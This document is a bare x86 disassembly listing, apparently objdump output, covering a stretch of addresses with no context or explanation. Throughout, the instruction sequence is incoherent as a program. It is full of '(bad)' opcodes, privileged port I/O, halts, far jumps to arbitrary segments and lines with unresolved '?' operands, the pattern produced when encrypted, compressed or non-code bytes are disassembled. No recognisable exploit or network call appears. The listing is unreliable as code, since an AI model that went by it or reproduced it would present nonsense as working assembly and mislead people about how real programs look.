  411fa7:	call   0x3ea7fe3a
  411fac:	dec    ecx
  411fad:	jmp    0xdfb9c46
  411fb2:	pop    edx
  411fb3:	fs jge 0x411fe2
  411fb6:	ins    BYTE PTR es:[edi],dx
  411fb7:	mov    dh,0xc
  411fb9:	xchg   ecx,eax
  411fba:	out    0xad,al
  411fbc:	popf   
  411fbd:	lahf   
  411fbe:	push   edi
  411fbf:	(bad)  
  411fc0:	andps  xmm1,XMMWORD PTR [edi+0x68]
  411fc4:	adc    DWORD PTR [eax-0x7a542002],0x92c45724
  411fce:	lods   al,BYTE PTR ds:[esi]
  411fcf:	cmp    ch,BYTE PTR [esi]
  411fd1:	sbb    DWORD PTR [edx+0x3],0xcba8c0ba
  411fd8:	minps  xmm5,XMMWORD PTR [ebx+0x3335da6b]
  411fdf:	cs xchg ecx,eax
  411fe1:	or     al,0xe4
  411fe4:	xor    DWORD PTR [edi+0x4104ed79],ebx
  411fea:	xchg   DWORD PTR [edx],edi
  411fec:	xor    al,BYTE PTR [ecx+0x1b1e0a81]
  411ff2:	adc    BYTE PTR [esi-0x30],bl
  411ff5:	mov    cl,0xaf
  411ff7:	aam    0x2e
  411ff9:	scas   al,BYTE PTR es:[edi]
  411ffa:	gs daa 
  411ffc:	xchg   si,ax
  411ffe:	mov    BYTE PTR [esp+esi*2-0x3e],0x42
  412003:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412005:	lods   al,BYTE PTR ds:[esi]
  412006:	pop    es
  412007:	call   0x5963aaf
  41200c:	cwde   
  41200d:	sub    ah,0xed
  412010:	ins    DWORD PTR es:[edi],dx
  412011:	and    al,0x86
  412013:	mov    WORD PTR [ebx],?
  412015:	jnp    0x411fd6
  412017:	and    BYTE PTR [edx],bl
  412019:	cld    
  41201a:	dec    edx
  41201b:	lods   eax,DWORD PTR ds:[esi]
  41201c:	adc    al,0xd6
  41201e:	lock loopne 0x411fa4
  412021:	fnstsw WORD PTR [edi+0x3a]
  412024:	popf   
  412025:	loopne 0x412063
  412027:	or     esi,DWORD PTR [ecx+edx*4]
  41202a:	fs adc eax,0x432c289
  412030:	xchg   DWORD PTR [esi+ebp*8-0x72],ecx
  412034:	in     al,dx
  412035:	push   0xffffffa5
  412037:	jns    0x411ff0
  412039:	dec    edi
  41203a:	mov    cs,WORD PTR [edx+0x38a92c0f]
  412040:	jmp    0xab5b:0xaef1d570
  412047:	xchg   ebx,eax
  412048:	push   ss
  412049:	ret    0x7360
  41204c:	push   esi
  41204d:	or     DWORD PTR [edi+0x78],ecx
  412050:	xchg   ebx,eax
  412051:	hlt    
  412052:	stos   BYTE PTR es:[edi],al
  412053:	push   ebp
  412054:	xor    eax,0x10910d62
  412059:	mov    WORD PTR [eax+0x4],ds
  41205c:	(bad)  
  41205d:	stc    
  41205e:	arpl   WORD PTR [edi-0xa921775],di
  412064:	(bad)  
  412065:	repnz dec ebp
  412067:	jmp    0x412079
  412069:	into   
  41206a:	outs   dx,BYTE PTR ds:[esi]
  41206b:	or     DWORD PTR [edi],edi
  41206d:	dec    edi
  41206e:	sti    
  41206f:	sbb    eax,0x841b3122
  412075:	jp     0x412044
  412077:	lods   eax,DWORD PTR ds:[esi]
  412078:	jl     0x412096
  41207a:	or     esp,esp
  41207c:	dec    ebp
  41207d:	xor    BYTE PTR [ecx-0x3b],dl
  412080:	sbb    DWORD PTR [esi-0x11],0xad1fad79
  412087:	adc    BYTE PTR [ebx-0x26],dh
  41208a:	add    al,0x7b
  41208c:	sub    eax,0x4caeb38
  412091:	mov    edx,0xb72d1559
  412096:	inc    ebp
  412097:	mov    ds:0x43af3a69,eax
  41209c:	sahf   
  41209d:	pop    es
  41209e:	scas   al,BYTE PTR es:[edi]
  41209f:	jnp    0x41210c
  4120a1:	cmc    
  4120a2:	inc    edi
  4120a3:	ins    DWORD PTR es:[edi],dx
  4120a4:	pop    edi
  4120a5:	mov    eax,0x104393ad
  4120aa:	repz pop ebx
  4120ac:	nop
  4120ad:	cwde   
  4120ae:	enter  0x63fa,0xe8
  4120b2:	lea    eax,[eax]
  4120b4:	jmp    0xf3da:0xbbfe1211
  4120bb:	jmp    0x27514eb2
  4120c0:	and    DWORD PTR ds:0xa43c331d,eax
  4120c6:	add    ch,BYTE PTR [ebx+0x2d]
  4120c9:	cmp    ecx,ebx
  4120cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120cc:	sub    DWORD PTR [edi-0x35],edx
  4120cf:	xchg   ebp,eax
  4120d0:	add    eax,DWORD PTR [ebp+0x17]
  4120d3:	out    0x7a,al
  4120d5:	cdq    
  4120d6:	cmp    esp,edx
  4120d8:	aad    0x2c
  4120da:	and    eax,0xa8f29e96
  4120df:	sbb    eax,0x3d1f5146
  4120e4:	ficom  DWORD PTR [edi-0x387048c6]
  4120ea:	aaa    
  4120eb:	sbb    ah,BYTE PTR [edi-0x30ac2e57]
  4120f1:	dec    edi
  4120f2:	or     DWORD PTR [ecx-0x4c],edi
  4120f5:	mov    ebx,esp
  4120f7:	(bad)  
  4120f8:	leave  
  4120f9:	fldenv [ecx+0x1a72f2fb]
  4120ff:	cmp    BYTE PTR [ebx-0x42ef41c0],ch
  412105:	fwait
  412106:	add    bh,0xf6
  412109:	inc    esp
  41210a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41210b:	out    0x39,eax
  41210d:	sbb    ah,dh
  41210f:	retw   0xead2
  412113:	out    dx,eax
  412114:	xchg   edi,eax
  412115:	mov    eax,0x36e2f5f8
  41211a:	je     0x41214a
  41211c:	inc    ebp
  41211d:	inc    edx
  41211e:	xlat   BYTE PTR ds:[ebx]
  41211f:	or     eax,DWORD PTR [ecx+ebx*8+0x12]
  412123:	inc    esi
  412124:	adc    BYTE PTR [edx-0x6c0162c6],dh
  41212a:	ret    
  41212b:	add    esp,DWORD PTR [edi]
  41212d:	mov    al,ds:0xa95ee6f5
  412132:	xor    eax,0x732032ec
  412137:	lahf   
  412138:	cli    
  412139:	js     0x4121b1
  41213b:	(bad)  
  41213c:	mov    ebx,0x47439fa1
  412141:	cdq    
  412142:	xchg   ebp,eax
  412143:	out    dx,eax
  412144:	icebp  
  412145:	mov    bl,0x73
  412147:	sbb    ecx,DWORD PTR [edi+0x70158f42]
  41214d:	sub    eax,0x43b50b6
  412152:	jns    0x41210f
  412154:	adc    eax,0x3a789865
  412159:	sbb    al,0x87
  41215b:	in     eax,dx
  41215c:	fisubr DWORD PTR [ecx+0x76522cfb]
  412162:	sub    ah,BYTE PTR [edx]
  412164:	fisubr WORD PTR [ebx]
  412166:	inc    ebx
  412167:	jnp    0x4121c3
  412169:	scas   eax,DWORD PTR es:[edi]
  41216a:	outs   dx,DWORD PTR ds:[esi]
  41216b:	or     ch,BYTE PTR ds:[edx+0x7d352b76]
  412172:	xchg   BYTE PTR [edi+edx*8-0x2e],dl
  412176:	add    BYTE PTR [edi+0x79],bh
  412179:	and    DWORD PTR [eax],edx
  41217b:	clc    
  41217c:	adc    al,0x14
  41217e:	out    dx,eax
  41217f:	pop    ecx
  412180:	cmp    esp,DWORD PTR [eax+0x4e37686a]
  412186:	xchg   ebp,eax
  412187:	xor    eax,0xb64d9432
  41218c:	push   0xb3502eed
  412191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412192:	adc    al,BYTE PTR [ebx+0x33]
  412195:	or     al,0xbe
  412197:	cmp    ecx,DWORD PTR [edx-0x4cd4a0cb]
  41219d:	repnz pop esp
  41219f:	test   eax,0x96f68460
  4121a4:	or     BYTE PTR [ebp-0x67827076],bh
  4121aa:	dec    ebp
  4121ab:	xchg   edx,eax
  4121ac:	push   cs
  4121ad:	jmp    0x8075:0xceca3551
  4121b4:	sbb    BYTE PTR [edx+0x66],al
  4121b7:	adc    eax,0x944dd628
  4121bc:	pop    ds
  4121bd:	cmp    al,0xac
  4121bf:	js     0x4121f0
  4121c1:	iret   
  4121c2:	push   ecx
  4121c3:	mov    cl,0x9c
  4121c5:	add    al,0x24
  4121c7:	xchg   edx,eax
  4121c8:	pop    ebx
  4121c9:	data16 (bad) 
  4121cb:	mov    edi,0xbd66e43e
  4121d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121d1:	scas   eax,DWORD PTR es:[edi]
  4121d2:	xchg   esi,eax
  4121d3:	push   ebx
  4121d4:	mov    al,0x2f
  4121d6:	xchg   ebp,eax
  4121d7:	les    ecx,FWORD PTR [edi-0x3317312e]
  4121dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121de:	inc    ebp
  4121df:	xor    ebx,edx
  4121e1:	jne    0x412250
  4121e3:	or     ebp,ebp
  4121e5:	dec    ebx
  4121e6:	and    dl,BYTE PTR [esi+0x55]
  4121e9:	mov    ah,0x76
  4121eb:	add    al,0xea
  4121ed:	retf   0x47e5
  4121f0:	enter  0x2460,0xef
  4121f4:	adc    BYTE PTR [esi-0x2ac37f3b],ch
  4121fa:	and    eax,DWORD PTR [ecx-0xd647668]
  412200:	ja     0x412205
  412202:	lock es popa 
  412205:	and    esp,esp
  412207:	scas   al,BYTE PTR es:[edi]
  412208:	mov    edx,0x8190abbd
  41220d:	or     ch,BYTE PTR [ecx]
  41220f:	fidivr WORD PTR [ebp+0x5e]
  412212:	ins    DWORD PTR es:[edi],dx
  412213:	jmp    0x1ffb2b4
  412218:	ins    DWORD PTR es:[edi],dx
  412219:	jle    0x41223b
  41221b:	cmp    BYTE PTR [edx],cl
  41221d:	scas   al,BYTE PTR es:[edi]
  41221e:	adc    al,0x80
  412220:	push   edx
  412221:	push   ebp
  412222:	out    dx,al
  412223:	clc    
  412224:	mov    cl,0xc2
  412226:	(bad)  
  412227:	clc    
  412228:	cwde   
  412229:	aaa    
  41222a:	fisttp WORD PTR [esi]
  41222c:	mov    ah,0x1d
  41222e:	scas   eax,DWORD PTR es:[edi]
  41222f:	adc    bh,ah
  412231:	adc    al,0xeb
  412233:	mov    dl,0xb4
  412235:	jle    0x4121ba
  412237:	lea    ebp,[edi-0x15d6c1c3]
  41223d:	dec    edi
  41223e:	pop    sp
  412240:	imul   esi,DWORD PTR [ebx+0x28]
  412244:	gs mov dl,0x16
  412247:	push   cs
  412248:	push   cs
  412249:	jae    0x412221
  41224b:	scas   al,BYTE PTR es:[edi]
  41224c:	push   0x78
  41224e:	mov    dl,dl
  412250:	sahf   
  412251:	jo     0x412203
  412253:	dec    ebp
  412254:	push   ebx
  412255:	mov    cl,0x65
  412257:	out    0x77,al
  412259:	jae    0x4122aa
  41225b:	int3   
  41225c:	or     DWORD PTR [ebp-0xb],eax
  41225f:	or     al,0x51
  412261:	aas    
  412262:	pop    edx
  412263:	push   ebp
  412264:	xchg   ecx,eax
  412265:	sub    dl,BYTE PTR [ebx-0x766022fe]
  41226b:	sub    esi,edx
  41226d:	(bad)
  412270:	pop    es
  412271:	rol    DWORD PTR [ecx+edx*8+0x67],1
  412275:	fld    DWORD PTR [edi]
  412277:	fcom   st(0)
  412279:	adc    al,0x8b
  41227b:	std    
  41227c:	cmp    al,0x85
  41227e:	rol    DWORD PTR [ecx+edx*4-0x14],1
  412282:	mov    ah,BYTE PTR [edx]
  412284:	mov    edi,0x28b17eee
  412289:	mov    bl,0x99
  41228b:	int    0xe5
  41228d:	mov    eax,0xf6f946d7
  412292:	sub    eax,0x64e11541
  412297:	inc    esi
  412298:	or     ecx,DWORD PTR [eax]
  41229a:	imul   DWORD PTR [edi-0x182921f9]
  4122a0:	and    DWORD PTR [esi+edi*2+0x6a1dc94a],eax
  4122a7:	lock shl DWORD PTR [eax-0x4b6178f2],1
  4122ae:	cmp    edi,DWORD PTR [ecx]
  4122b0:	and    DWORD PTR [ecx+0x76],edi
  4122b3:	rol    DWORD PTR [esi],cl
  4122b5:	scas   al,BYTE PTR es:[edi]
  4122b6:	popf   
  4122b7:	ss mov edi,0x23e4355d
  4122bd:	sar    edi,cl
  4122bf:	stc    
  4122c0:	and    DWORD PTR [eax],edi
  4122c2:	shr    DWORD PTR [eax+0x31914936],0xcc
  4122c9:	push   es
  4122ca:	inc    esp
  4122cb:	xor    BYTE PTR [ebx+0x47],dl
  4122ce:	sub    BYTE PTR [edx+0x62aa2757],bh
  4122d4:	sub    ebx,ecx
  4122d6:	stc    
  4122d7:	mov    esp,0x4c9f5ddc
  4122dc:	jne    0x412335
  4122de:	xchg   ebx,eax
  4122df:	in     al,dx
  4122e0:	push   ecx
  4122e1:	test   DWORD PTR [edi-0x40],eax
  4122e4:	in     al,0xe2
  4122e6:	call   0x21159068
  4122eb:	hlt    
  4122ec:	adc    dh,BYTE PTR [ecx]
  4122ee:	into   
  4122ef:	jno    0x412278
  4122f1:	dec    esp
  4122f2:	mov    ebx,0x47001781
  4122f7:	sub    BYTE PTR [edi-0x14b27c21],0xe5
  4122fe:	dec    ecx
  4122ff:	retf   
  412300:	test   al,0xfd
  412302:	and    edx,ebx
  412304:	call   0x3c2f:0xe3f296a8
  41230b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41230c:	xchg   edx,eax
  41230d:	test   ebx,0xdf97cd36
  412313:	adc    esp,DWORD PTR [esp+ebp*2-0x1197328c]
  41231a:	test   al,0x12
  41231c:	or     dl,ah
  41231e:	iret   
  41231f:	mov    bl,0x38
  412321:	jnp    0x412327
  412323:	mov    ebp,DWORD PTR [eax+eax*1+0x2e27b465]
  41232a:	xchg   DWORD PTR ss:[ebx],ebx
  41232d:	ds pop esp
  41232f:	sbb    ah,cl
  412331:	scas   eax,DWORD PTR es:[edi]
  412332:	pop    es
  412333:	sbb    al,0x1c
  412335:	cmp    eax,0xc29f3b61
  41233a:	sub    DWORD PTR [edx-0x1261ab23],edi
  412340:	call   0x5d91e2dc
  412345:	jb     0x41232a
  412347:	(bad)  
  412348:	pop    ds
  412349:	cs jns 0x412336
  41234c:	stos   BYTE PTR es:[edi],al
  41234d:	sub    eax,0x8dba6fa1
  412352:	jecxz  0x4123c5
  412354:	ror    ebp,1
  412356:	cmp    bl,BYTE PTR [ebx+0x5c4b4d4f]
  41235c:	xor    al,0x43
  41235e:	jmp    0x41235d
  412360:	sub    esp,ebx
  412362:	fbld   TBYTE PTR [edi+0x73]
  412365:	test   DWORD PTR [edi+0x6fe2f16c],esi
  41236b:	inc    esi
  41236c:	push   ss
  41236d:	mov    ecx,0x199bec31
  412372:	imul   eax,DWORD PTR [esi+0x1a],0xf688ed97
  412379:	ins    DWORD PTR es:[edi],dx
  41237a:	mov    ch,0xe5
  41237c:	mov    ebx,0x2e59bf50
  412381:	pop    esp
  412382:	loopne 0x4123e5
  412384:	jo     0x4123b5
  412386:	cmp    al,0x66
  412388:	mov    ecx,0xea4e76d
  41238d:	pop    ss
  41238e:	pop    ss
  41238f:	setb   BYTE PTR ds:0x49ee1382
  412396:	mov    ebp,0xcfcfcd31
  41239b:	ins    DWORD PTR es:[edi],dx
  41239c:	sbb    eax,0x755aded7
  4123a1:	mov    edx,0x7b82af3b
  4123a6:	leave  
  4123a7:	in     al,dx
  4123a8:	or     dh,0xaf
  4123ab:	mov    WORD PTR [eax+0x5b1162d9],es
  4123b1:	jbe    0x4123d8
  4123b3:	xchg   edx,eax
  4123b4:	out    dx,al
  4123b5:	sbb    al,0xbd
  4123b7:	sub    al,0xd5
  4123b9:	rol    DWORD PTR [edx+edi*4+0x42],0xae
  4123be:	ds ins DWORD PTR es:[edi],dx
  4123c0:	jge    0x4123c5
  4123c2:	push   edi
  4123c3:	ficomp WORD PTR [edi]
  4123c5:	xor    ah,BYTE PTR ds:0xcc91725e
  4123cb:	(bad)  
  4123cc:	adc    esp,ecx
  4123ce:	mov    cl,0x4a
  4123d0:	sbb    esp,DWORD PTR [ecx+0x58]
  4123d3:	sbb    eax,0x37f70857
  4123d8:	xchg   esi,eax
  4123d9:	mov    ebx,DWORD PTR [ecx+0x6d]
  4123dc:	xchg   bl,ch
  4123de:	lahf   
  4123df:	jecxz  0x41241b
  4123e1:	sbb    DWORD PTR [esi+0x51],0xec7bf9ca
  4123e8:	stc    
  4123e9:	push   eax
  4123ea:	aaa    
  4123eb:	mov    ds:0xc270db8a,eax
  4123f0:	stc    
  4123f1:	inc    ecx
  4123f2:	push   eax
  4123f3:	push   edi
  4123f4:	bound  eax,QWORD PTR [eax+esi*8-0x28c953b]
  4123fb:	mov    al,ds:0x1bf20e0a
  412400:	jle    0x412419
  412402:	aas    
  412403:	pop    edx
  412404:	inc    edi
  412405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412406:	cmp    dh,BYTE PTR [edi+0x74]
  412409:	mov    eax,0x57b6edee
  41240e:	sub    cl,dh
  412410:	lds    ebp,FWORD PTR [eax]
  412412:	lods   al,BYTE PTR ds:[esi]
  412413:	clc    
  412414:	jbe    0x412467
  412416:	inc    ebp
  412417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412418:	cmp    dh,dl
  41241a:	rol    DWORD PTR [eax+0x300c8dda],1
  412420:	je     0x4123d8
  412422:	sar    BYTE PTR [eax+0x78],1
  412425:	pop    esi
  412426:	sbb    al,0xa9
  412428:	inc    esi
  412429:	sub    BYTE PTR [ebp+0x74],0x70
  41242d:	cli    
  41242e:	inc    eax
  41242f:	ins    DWORD PTR es:[edi],dx
  412430:	cmp    BYTE PTR [edi+0xc85d10c],bh
  412436:	stc    
  412437:	mov    bl,0x39
  412439:	inc    edx
  41243a:	jns    0x412457
  41243c:	pushf  
  41243d:	jne    0x4124b6
  41243f:	stc    
  412440:	in     al,dx
  412441:	outs   dx,BYTE PTR ds:[esi]
  412442:	repnz xor DWORD PTR [esi],esi
  412445:	pop    ebx
  412447:	mov    esp,0xdb91415f
  41244c:	mov    al,0x70
  41244e:	cmc    
  41244f:	inc    esp
  412450:	(bad)  [eax]
  412452:	sbb    dh,BYTE PTR [ecx]
  412454:	pop    ecx
  412455:	jp     0x412431
  412457:	and    al,0xf5
  412459:	mov    BYTE PTR [esi+0x1e8a30e9],ah
  41245f:	push   es
  412460:	cwde   
  412461:	cmp    al,0x91
  412463:	packssdw mm6,QWORD PTR [ebp-0x378d6d29]
  41246a:	ins    BYTE PTR es:[edi],dx
  41246b:	test   DWORD PTR [ecx],0x56d05e46
  412471:	ret    
  412472:	sub    BYTE PTR [ebx+edx*1],dh
  412475:	sbb    BYTE PTR [edx-0x43],ah
  412478:	inc    eax
  412479:	outs   dx,DWORD PTR ds:[esi]
  41247a:	fnstenv [ebp+0xdcbbc3d]
  412480:	inc    ebp
  412481:	ret    0x7ee5
  412484:	(bad)  
  412485:	inc    DWORD PTR cs:[eax]
  412488:	ret    
  412489:	(bad)  
  41248a:	xlat   BYTE PTR ds:[ebx]
  41248b:	push   ebp
  41248c:	xchg   DWORD PTR [edx-0x3dd4f591],ebx
  412492:	cmp    al,0xe6
  412494:	ret    0xe6b3
  412497:	jnp    0x41244f
  412499:	and    bh,al
  41249b:	add    esi,DWORD PTR [esi+0x37065c0a]
  4124a1:	sbb    eax,0x10bc2453
  4124a6:	push   ebx
  4124a7:	push   edx
  4124a8:	xchg   ebx,eax
  4124a9:	jmp    0x6196:0xeb9805b3
  4124b0:	ds stc 
  4124b2:	mov    edx,0x55ded627
  4124b7:	mov    ?,edx
  4124b9:	mov    edi,0x2a976780
  4124be:	push   eax
  4124bf:	ret    0x6ce7
  4124c2:	and    DWORD PTR [esi+0x56],edx
  4124c5:	mov    DWORD PTR [edx-0x22],ebp
  4124c8:	mov    ebx,DWORD PTR [edi+0x72]
  4124cb:	sbb    ebp,DWORD PTR [eax-0x16]
  4124ce:	cwde   
  4124cf:	js     0x41253e
  4124d1:	scas   eax,DWORD PTR es:[edi]
  4124d2:	retf   0x5fdd
  4124d5:	in     eax,0x2d
  4124d7:	std    
  4124d8:	mov    bh,0x83
  4124da:	mov    dh,ah
  4124dc:	stc    
  4124dd:	pushf  
  4124de:	inc    eax
  4124df:	jg     0x412548
  4124e1:	popa   
  4124e2:	arpl   WORD PTR ds:0x28e2b78a,sp
  4124e8:	and    edx,DWORD PTR [edx-0x35]
  4124eb:	push   0x59
  4124ed:	jbe    0x4124a4
  4124ef:	mov    cl,bh
  4124f1:	pop    ebx
  4124f2:	pop    edx
  4124f3:	retf   
  4124f4:	push   edi
  4124f5:	mov    DWORD PTR [eax],ecx
  4124f7:	addr16 sbb al,0xda
  4124fa:	push   esi
  4124fb:	sbb    ebx,0x50
  4124fe:	jae    0x4124ab
  412500:	imul   ecx,ebp,0x34868b92
  412506:	inc    esi
  412507:	fs jnp 0x41253c
  41250a:	inc    ebx
  41250b:	in     eax,0xc2
  41250d:	mov    eax,0xa4f93a29
  412512:	outs   dx,BYTE PTR ds:[si]
  412514:	nop
  412515:	jb     0x4124a8
  412517:	lahf   
  412518:	lods   eax,DWORD PTR ds:[esi]
  412519:	xor    esp,DWORD PTR [ecx+eax*4]
  41251c:	pop    esp
  41251d:	jg     0x4124bf
  41251f:	aas    
  412520:	pop    ecx
  412521:	jge    0x412561
  412523:	mov    ds:0xe64462d7,al
  412528:	shl    DWORD PTR [ebp+0x48],1
  41252b:	jbe    0x41251a
  41252d:	ja     0x412590
  41252f:	outs   dx,BYTE PTR ds:[esi]
  412530:	push   ss
  412531:	repz xchg ecx,eax
  412533:	fstp   QWORD PTR [eax-0x35ffb663]
  412539:	jmp    0x4041:0x78e93f69
  412540:	sub    dh,BYTE PTR [ecx-0x36]
  412543:	xchg   DWORD PTR [edi+0x47],esp
  412546:	xchg   esp,eax
  412547:	iret   
  412548:	and    BYTE PTR [esi-0x7236be19],ah
  41254e:	jno    0x4124f2
  412550:	lods   eax,DWORD PTR ds:[esi]
  412551:	daa    
  412552:	pop    ss
  412553:	add    DWORD PTR [esi],ebx
  412555:	push   cs
  412556:	fdivr  st,st(4)
  412558:	clc    
  412559:	mov    esp,0x5fd620ab
  41255e:	retf   
  41255f:	ins    DWORD PTR es:[edi],dx
  412560:	jne    0x4125ca
  412562:	sub    eax,0xcc7fbc8
  412567:	shl    BYTE PTR ds:0x47a3f9e8,1
  41256d:	int    0x6f
  41256f:	pop    ebp
  412570:	and    DWORD PTR [ebx+0x40],ebx
  412573:	cmp    DWORD PTR [ecx],esi
  412575:	xchg   ebx,eax
  412576:	test   ebx,eax
  412578:	pop    ebx
  412579:	jl     0x412510
  41257b:	popf   
  41257c:	add    al,0xa1
  41257e:	mov    ebp,0x4031b5dd
  412583:	and    al,0x73
  412585:	push   ds
  412586:	or     al,BYTE PTR [ebx-0x13]
  412589:	fidivr DWORD PTR [esp+edi*4]
  41258c:	cmp    BYTE PTR [edx+eiz*1+0x1c],bl
  412590:	imul   esp,DWORD PTR gs:[ebx+0x50],0x71
  412595:	es push cs
  412597:	and    edx,esp
  412599:	nop
  41259a:	cli    
  41259b:	fadd   DWORD PTR [ebx-0x555ce7ac]
  4125a1:	jno    0x412569
  4125a3:	popf   
  4125a4:	fisttp QWORD PTR [edi-0x34]
  4125a7:	inc    esp
  4125a8:	inc    ecx
  4125a9:	ficomp WORD PTR [ebx+0x77]
  4125ac:	scas   eax,DWORD PTR es:[edi]
  4125ad:	cmp    al,0x53
  4125af:	push   edi
  4125b0:	pop    edx
  4125b1:	dec    edx
  4125b2:	or     BYTE PTR ds:0x5348a276,al
  4125b8:	mov    al,ds:0x80fa35c7
  4125bd:	inc    ecx
  4125be:	xchg   esp,eax
  4125bf:	cmp    DWORD PTR [ebx+ebp*2+0x4a],ecx
  4125c3:	fnstenv [edx]
  4125c5:	sub    eax,0xfe904cbd
  4125ca:	lods   eax,DWORD PTR ds:[esi]
  4125cb:	mov    dl,0xce
  4125cd:	mov    ebx,0x676015
  4125d2:	sub    BYTE PTR [eax-0x48ffed5c],bl
  4125d8:	or     ch,BYTE PTR [esp+ecx*2-0x2b332cdb]
  4125df:	inc    ebx
  4125e0:	(bad)
  4125e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125e5:	fild   DWORD PTR [edx]
  4125e7:	fnsave [ecx-0x737f85c2]
  4125ed:	mov    edi,0x13a7b798
  4125f2:	jne    0x412644
  4125f4:	xchg   dh,ch
  4125f6:	sub    eax,DWORD PTR [eax+ebp*1-0x4]
  4125fa:	retf   
  4125fb:	jnp    0x41266f
  4125fd:	xor    ebp,eax
  4125ff:	xchg   DWORD PTR [eax],edi
  412601:	mov    ah,dh
  412603:	dec    ecx
  412604:	add    dl,BYTE PTR [esi]
  412606:	dec    ebp
  412607:	xchg   edi,eax
  412608:	mov    ebx,0x1f667e14
  41260d:	(bad)  
  41260e:	sahf   
  41260f:	or     bl,BYTE PTR ds:0x11de73cc
  412615:	fldlg2 
  412617:	mov    BYTE PTR [ebx+0x5e],bh
  41261a:	and    ebp,DWORD PTR [ebp+0x29]
  41261d:	fcomp  QWORD PTR [edx+ebp*1+0x6e4fd2f6]
  412624:	xor    eax,0x1fedfb9
  412629:	inc    eax
  41262a:	dec    esi
  41262b:	fistp  QWORD PTR [esp+edx*8+0x2e2cb2c9]
  412632:	outs   dx,BYTE PTR ds:[esi]
  412633:	adc    al,0x5a
  412635:	data16 std 
  412637:	popa   
  412638:	mov    ds:0xdc123a87,al
  41263d:	mov    ah,0xaa
  41263f:	lahf   
  412640:	sub    DWORD PTR [eax],eax
  412642:	mov    esi,0x361d0221
  412647:	or     BYTE PTR [eax],dl
  412649:	in     al,dx
  41264a:	repz jmp 0x5c88743
  412650:	adc    ch,ah
  412652:	fs push ebp
  412654:	int    0xe3
  412656:	dec    edx
  412657:	mov    dl,0xec
  412659:	call   0x276e:0x5f0493d8
  412660:	sub    eax,0xb233c6a6
  412665:	rcr    BYTE PTR [edx+eax*4+0x75564779],1
  41266c:	push   0x3d
  41266e:	xlat   BYTE PTR ds:[ebx]
  41266f:	mov    edx,0x64b8ce32
  412674:	sub    eax,0xc79aecbb
  412679:	mov    cl,0xbd
  41267b:	jl     0x41268a
  41267d:	mov    ecx,0x9d3dd59f
  412682:	xchg   edi,eax
  412683:	sub    DWORD PTR [edi+0x5d],ebp
  412686:	xchg   ecx,eax
  412687:	cmp    BYTE PTR [ebp-0x39],dh
  41268a:	fnstsw WORD PTR [edi+eax*4]
  41268d:	jno    0x412663
  41268f:	call   0xedfafe28
  412694:	repz jns 0x4126f4
  412697:	mov    ds:0x763ded95,al
  41269c:	loope  0x41264e
  41269e:	dec    ebx
  41269f:	mov    dh,0x1b
  4126a1:	popa   
  4126a2:	mov    esp,0xd61e115f
  4126a7:	and    edi,DWORD PTR [edi-0x5]
  4126aa:	outs   dx,BYTE PTR ds:[esi]
  4126ab:	xchg   DWORD PTR [ecx],edx
  4126ad:	dec    ebx
  4126ae:	adc    BYTE PTR [ecx],dl
  4126b0:	push   esi
  4126b1:	sbb    eax,0xce065209
  4126b6:	retf   
  4126b7:	arpl   WORD PTR [ebx-0x83a9bd8],di
  4126bd:	shl    BYTE PTR [edx+0x6d],cl
  4126c0:	push   esi
  4126c1:	sbb    cl,al
  4126c3:	xchg   esp,eax
  4126c4:	ins    BYTE PTR es:[edi],dx
  4126c5:	sub    al,0x78
  4126c7:	xchg   esi,eax
  4126c8:	mov    cl,0x64
  4126ca:	mov    ebx,0x89b4909b
  4126cf:	sub    DWORD PTR [ebp+0x25d6a4ec],esp
  4126d5:	stc    
  4126d6:	dec    esp
  4126d7:	jp     0x412734
  4126d9:	stos   BYTE PTR es:[edi],al
  4126da:	aas    
  4126db:	std    
  4126dc:	pop    ebp
  4126dd:	(bad)  
  4126de:	stos   DWORD PTR es:[edi],eax
  4126df:	fisttp DWORD PTR [ebx+0x9]
  4126e2:	and    ebp,esp
  4126e4:	shr    BYTE PTR [esi-0x7f],0x85
  4126e8:	(bad)  
  4126e9:	cli    
  4126ea:	adc    eax,0xe9687a1d
  4126ef:	xchg   esp,eax
  4126f0:	pop    ds
  4126f1:	push   ebx
  4126f2:	test   ebp,0xf6d0c44
  4126f8:	cli    
  4126f9:	cli    
  4126fa:	xchg   edi,eax
  4126fb:	mov    WORD PTR [edx+ebp*8],cs
  4126fe:	dec    ecx
  4126ff:	test   al,0x5c
  412701:	pop    ebx
  412702:	mov    esp,0x2b9373d8
  412707:	in     eax,0xb9
  412709:	ret    0x8c84
  41270c:	pop    ds
  41270d:	icebp  
  41270e:	inc    ebp
  41270f:	cmp    eax,0x5715e941
  412714:	aad    0x32
  412716:	je     0x4126f9
  412718:	sub    ebp,DWORD PTR [ebx]
  41271a:	call   0xc5fc:0x44d61b3d
  412721:	mov    edi,0x16b942fe
  412726:	test   al,0x6b
  412728:	fcom   st(0)
  41272a:	mov    eax,ds:0x5eb63b88
  41272f:	ror    DWORD PTR [esp+ebp*8],0xa6
  412733:	xchg   ecx,eax
  412734:	retf   0x2dce
  412737:	cmp    dh,BYTE PTR [eax-0x4]
  41273a:	pop    ebp
  41273b:	dec    eax
  41273c:	aad    0x8e
  41273e:	inc    eax
  41273f:	mov    ebp,0x5cfecfb3
  412744:	cmp    dh,BYTE PTR [ebp-0x7047319b]
  41274a:	xor    esi,ebp
  41274c:	cmp    eax,0xa7ea5c3
  412751:	iret   
  412752:	push   esp
  412753:	push   0xec4a54af
  412758:	(bad)  
  412759:	sbb    ah,ah
  41275b:	cwde   
  41275c:	aaa    
  41275d:	ja     0x4127c7
  41275f:	neg    BYTE PTR ds:0x90d64e92
  412765:	xor    bl,BYTE PTR [ecx+eax*4+0x1b]
  412769:	and    eax,0xf88b76f4
  41276e:	cmp    eax,0x45df1630
  412773:	or     eax,0x3a6529b
  412778:	jmp    0x242e:0x1433fd32
  41277f:	adc    BYTE PTR [ebx+0x59],ch
  412782:	nop
  412783:	jmp    0x412747
  412785:	int3   
  412786:	jo     0x4127a1
  412788:	mov    esi,0xc71a80af
  41278d:	jae    0x412735
